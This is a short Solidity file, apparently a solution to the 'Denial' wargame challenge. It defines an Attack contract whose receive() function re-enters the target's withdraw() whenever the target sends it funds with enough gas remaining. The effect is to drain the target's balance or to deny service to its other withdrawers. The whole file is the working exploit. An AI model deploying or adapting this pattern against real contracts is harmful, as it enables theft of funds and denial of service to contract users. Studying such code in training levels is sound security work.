// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract Attack {

    // Allow deposit of funds
    receive() external payable {
        Denial caller = Denial(payable(msg.sender));

        //If the transaction is of 1M gas or less
        if ((gasleft() <= 1000000) &&
            (msg.sender.balance > 0)) {

            caller.withdraw();
        }
    }
}